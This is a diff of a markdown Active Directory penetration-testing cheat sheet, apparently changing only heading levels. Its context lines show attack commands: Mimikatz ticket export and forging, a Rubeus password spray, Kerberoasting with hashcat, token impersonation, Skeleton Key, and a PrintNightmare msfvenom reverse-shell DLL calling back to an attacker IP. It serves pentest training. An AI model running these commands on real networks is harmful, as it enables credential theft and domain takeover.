@@ -77,7 +77,7 @@ Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
 ### IMPACKET-PSEXEC
 
-### Hands On
+#### Hands On
 
 
  > 
@@ -105,20 +105,20 @@ Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
 ### GPP-DECRYPT
 
-### Principle
+#### Principle
 
 GPP (Group Policy Preferences) are policies with credentials embedded (they are encrypted and placed in `cPassword`).
 
 The encryption key was released, so it is possible to decrypt GPP policies that have been encrypted with this key.
 
-### Detection
+#### Detection
 
 
  > 
  > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**</br>
  > Detect vulnerable GPP policies (credentials encrypted with leaked key).
 
-### Hands On
+#### Hands On
 
 
  > 
@@ -216,9 +216,9 @@ There are two different hash types, `LM` and `NT`:
 
 ### MIMIKATZ
 
-### Hands On
+#### Hands On
 
-#### Find Local Kribi Tickets
+##### Find Local Kribi Tickets
 
 
  > 
@@ -230,14 +230,14 @@ There are two different hash types, `LM` and `NT`:
  > **<font color=red>sekurlsa::tickets /export</font>**</br>
  > Export all `.kirbi` tickets into the current directory.
 
-#### Find others Kirbi Tickets (Password Spray)
+##### Find others Kirbi Tickets (Password Spray)
 
 
  > 
  > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**</br>
  > Spray a password against all users in current domain and return the `.kirbi` TGT of users that use this password.
 
-#### Pass the Ticket
+##### Pass the Ticket
 
 
  > 
@@ -250,7 +250,7 @@ There are two different hash types, `LM` and `NT`:
 
 ### METERPRETER
 
-### Theory
+#### Theory
 
 Tokens are like session cookies to access a system or network.
 
@@ -262,7 +262,7 @@ They are two types of tokens:
 * Impersonate: Non-interactive, such as attaching a network drive or a domain logon script.
   Credit: TCM Security
 
-### Hands on
+#### Hands on
 
 If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.
 
@@ -288,7 +288,7 @@ The safest to pick is **services.exe**.
  > **<font color=red>rev2self</font>**</br>
  > Revert to previous user.
 
-### Mitigation
+#### Mitigation
 
 * Limit user/group token creation permissions.
 
@@ -298,19 +298,19 @@ The safest to pick is **services.exe**.
 
 ### Kerberoasting
 
-### Principle
+#### Principle
 
 SPN (Service Principal Name) is the mapping between a service and the account or the name of the machine with which the service is associated.
 
 ![exploit_kerberoasting_principle.png](../../attachments/exploit_kerberoasting_principle.png)
 
-### Requirements
+#### Requirements
 
 * Have valid user credentials (not necessarily admin).
 
-### Hands On
+#### Hands On
 
-#### With Impacket (remote)
+##### With Impacket (remote)
 
  > 
  > **<font color=red>setspn -T medin -Q ​ */*</font>**</br>
@@ -326,7 +326,7 @@ SPN (Service Principal Name) is the mapping between a service and the account or
  > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
  > Crack Kerberos KRB_TGS_REP hash.
 
-#### With RUBEUS (on target machine)
+##### With RUBEUS (on target machine)
 
 
  > 
@@ -338,7 +338,7 @@ SPN (Service Principal Name) is the mapping between a service and the account or
  > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
  > Crack Kerberos KRB_TGS_REP hash.
 
-### Mitigation
+#### Mitigation
 
 * Have a very strong password for service accounts.
 * Don’t make services accounts domain administrators.
@@ -365,20 +365,20 @@ This attack require users with pre-authentication disabled.
 
 ### MIMIKATZ
 
-### Principle
+#### Principle
 
 Forge a special ticket and then is it with Pass the Ticket Attack to gain elevated privileges. 
 A Golden Ticket is TGT (Ticket Granting Ticket).
 A Silver Ticker is TGS (Ticket Granting Service).
 
-### Requirements
+#### Requirements
 
 
  > 
  > **<font color=red>privilege::debug</font>**</br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
-### Hands On (MIMIKATZ)
+#### Hands On (MIMIKATZ)
 
 
  > 
@@ -415,23 +415,23 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
 
 ### PrintNightmare (CVE-2021-1675)
 
-### Hands On
+#### Hands On
 
-#### Generate Malicious DLL
+##### Generate Malicious DLL
 
 
  > 
  > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
  > Generate a malicious DLL (meterpreter reverse shell).
 
-#### Create an SMB Share to Serve the Malicious DLL
+##### Create an SMB Share to Serve the Malicious DLL
 
 
  > 
  > **<font color=red>python3 /opt/impacket/examples/smbserver.py</font> myShareName /path/to/folder/ <font color=red>-smb2support</font>**</br>
  > Set up an SMB share.
 
-#### Set up Handler
+##### Set up Handler
 
 
  > 
@@ -440,7 +440,7 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
  > **<font color=red>set payload</font> windows/x64/meterpreter/reverse_tcp**</br>
  > Handler for Windows Meterpreter.
 
-#### Exploit
+##### Exploit
 
 **https://github.com/cube0x0/CVE-2021-1675** 
 
@@ -455,18 +455,18 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
 
 ### Skeleton Key
 
-### Principle
+#### Principle
 
 The Skeleton Key is backdoor: this attack set a master password for domain Admin. It will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques 
 
-### Requirements
+#### Requirements
 
 
  > 
  > **<font color=red>privilege::debug</font>**</br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
-### Hands On
+#### Hands On
 
 
  > 
